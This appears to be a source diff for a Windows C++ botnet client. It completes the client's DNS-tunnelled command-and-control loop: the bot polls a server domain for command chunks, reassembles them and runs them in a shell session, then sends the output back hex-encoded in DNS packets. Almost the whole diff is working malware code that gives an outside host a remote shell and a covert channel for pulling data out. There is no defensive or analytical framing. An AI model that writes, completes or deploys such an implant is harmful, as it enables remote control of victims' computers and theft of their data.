@@ -10,21 +10,77 @@ void EnqueueSend(const std::string& s) {
     send_queue.push(s);
 }
 
+void EnqueueExecute(const std::string& s) {
+    std::lock_guard<std::mutex> lk(execute_mutex);
+    execute_queue.push(s);
+}
+
 DWORD senderBotnetThread(LPVOID lpParam)
 {
-    while (!should_stop_sender) {
+    while (true) {
+        // --- Phase 1: Poll for command chunks from server ---
+        std::vector<std::string> command_chunks;
+        size_t chunk_offset = 0;
 
-        vector<string> command_chunks;
-        int chunk_index = 0;
+        std::cout << "\n[Polling] Checking for new command from server...\n";
 
         while (true)
         {
-            // TODO: viet tiep phan nay
+            // Send Type P packet to poll for next chunk
+            int retcode = sendDataTypeP(connectionId, packetNumber, chunk_offset, TARGET_DOMAIN.c_str());
+
+            if (retcode == 1) {
+                // Successfully received a chunk
+                std::string chunk_data;
+                {
+                    std::lock_guard<std::mutex> lock(g_outChunkMutex);
+                    // Convert wstring to string
+                    int size_needed = WideCharToMultiByte(CP_UTF8, 0, g_outChunk.c_str(), -1, nullptr, 0, nullptr, nullptr);
+                    if (size_needed > 0) {
+                        std::string temp(size_needed - 1, 0);
+                        WideCharToMultiByte(CP_UTF8, 0, g_outChunk.c_str(), -1, &temp[0], size_needed, nullptr, nullptr);
+                        chunk_data = temp;
+                    }
+                }
+
+                if (!chunk_data.empty()) {
+                    std::cout << "  [+] Received chunk " << chunk_offset << " (" << chunk_data.length() << " bytes)\n";
+                    command_chunks.push_back(chunk_data);
+                    chunk_offset++;
+                    Sleep(50); // Small delay between chunk requests
+                } else {
+                    break;
+                }
+            } 
+            else if (retcode == 0) {
+                // No more chunks (empty response or end of command)
+                std::cout << "  [*] End of command chunks (retcode=0)\n";
+                break;
+            } 
+            else {
+                // Error occurred (retcode == -1)
+                std::cout << "  [!] Error polling for chunks (retcode=-1)\n";
+                break;
+            }
         }
 
+        // --- Phase 2: Check if we have a command to process ---
         std::string dataToSend;
 
-        // Check queue
+        if (!command_chunks.empty()) {
+            // Reassemble the full command from chunks
+            std::string full_command;
+            for (const auto& chunk : command_chunks) {
+                full_command += chunk;
+            }
+            std::cout << "[+] Command reassembled: '" << full_command << "' (" << full_command.length() << " bytes)\n";
+
+            // Enqueue the command for execution (or process it here)
+            EnqueueExecute(full_command);
+            std::cout << "[+] Command enqueued for execution\n";
+        }
+
+        // --- Phase 3: Check queue for data to send back ---
         {
             std::lock_guard<std::mutex> lock(queue_mutex);
             if (!send_queue.empty()) {
@@ -33,40 +89,51 @@ DWORD senderBotnetThread(LPVOID lpParam)
             }
         }
 
-        // Send data if available
+        // --- Phase 4: Send data back to server in chunks ---
         if (!dataToSend.empty()) {
-            // Split dataToSend into chunks of MaxLen and send each chunk
+            std::cout << "[Sending] Transmitting result (" << dataToSend.length() << " bytes) in chunks...\n";
+            
+            // Split dataToSend into chunks of max_len and send each chunk
             size_t offset = 0;
             size_t offset_number = 0;
             const size_t totalLen = dataToSend.size();
+            
             while (offset < totalLen) {
                 size_t chunkLen = std::min<size_t>(max_len, totalLen - offset);
                 std::string chunk = dataToSend.substr(offset, chunkLen);
-                offset_number = offset % max_len;
-                std::cout << packet_number;
-                // TODO: kiem tra lai cho nay khi sua xong server
-                int success = sendDataTypeC(connectionId, packet_number, offset_number,
-                                            TARGET_DOMAIN.c_str(), chunk.c_str());
+                offset_number = offset / max_len;
+                
+                std::cout << "  [+] Sending chunk " << offset_number << " (packet #" << packetNumber << ")\n";
+                
+                // Convert chunk to hex for DNS transmission
+                std::string chunkHex = convertToHex(chunk.c_str());
+                int success = sendDataTypeC(connectionId, packetNumber, offset_number,
+                                            TARGET_DOMAIN.c_str(), chunkHex.c_str());
 
                 if (success == 0) {
-                    // sent OK -> increment packet number
-                    packet_number++;
-                    if (packet_number > 999) {
-                        packet_number = 0;
+                    // Sent OK -> increment packet number
+                    packetNumber++;
+                    if (packetNumber > 999) {
+                        packetNumber = 0;
                     }
 
                     offset += chunkLen;
-                    offset_number += 1;
-                    Sleep(10);
+                    Sleep(50);
                 } else {
-                    // Re-enqueue remaining data
-                    // std::string remaining = dataToSend.substr(offset);
-                    // EnqueueSend(remaining);
+                    std::cout << "  [!] Failed to send chunk, stopping transmission\n";
+                    // Re-enqueue remaining data if needed
+                    std::string remaining = dataToSend.substr(offset);
+                    EnqueueSend(remaining);
                     break;
                 }
             }
+            
+            if (offset >= totalLen) {
+                std::cout << "[+] All result chunks sent successfully\n";
+            }
         } else {
-            Sleep(100);
+            // No data to send, brief wait before next poll cycle
+            Sleep(2000);
         }
     }
     return 0;
@@ -74,28 +141,46 @@ DWORD senderBotnetThread(LPVOID lpParam)
 
 DWORD handle_botnet(LPVOID lpParam)
 {
-    HandleExec();
-    return 0;
-}
-
-
-bool HandleExec()
-{
     ConsoleClient client;
     Shell shell(&client);
 
     if (!shell.CreateSession()) {
-        std::cerr << "Failed to create session\n";
-        return true;
+        std::cerr << "[!] Failed to create shell session\n";
+        return 1;
     }
 
-    // Demo: send a couple commands
-    shell.ExecuteCommand("echo Hello from C++");
-    std::this_thread::sleep_for(std::chrono::seconds(1));
-    shell.ExecuteCommand("chcp");
-    std::this_thread::sleep_for(std::chrono::seconds(2));
+    std::cout << "[+] Shell session created successfully\n";
 
-    // Cleanup
+    while (true) {
+        std::string commandToExecute;
+
+        // Check execute_queue for commands
+        {
+            std::lock_guard<std::mutex> lock(execute_mutex);
+            if (!execute_queue.empty()) {
+                commandToExecute = execute_queue.front();
+                execute_queue.pop();
+            }
+        }
+
+        // Execute command if available
+        if (!commandToExecute.empty()) {
+            std::cout << "[Execute] Running command: '" << commandToExecute << "'\n";
+            bool success = shell.ExecuteCommand(commandToExecute);
+            
+            if (success) {
+                std::cout << "[Execute] Command executed successfully\n";
+                // Output will be automatically sent via ConsoleClient::Send -> EnqueueSend
+            } else {
+                std::cout << "[Execute] Command execution failed\n";
+            }
+        } else {
+            // No command to execute, wait briefly
+            Sleep(100);
+        }
+    }
+
+    // Cleanup (unreachable in infinite loop, but kept for completeness)
     shell.Dispose();
-    return false;
+    return 0;
 }
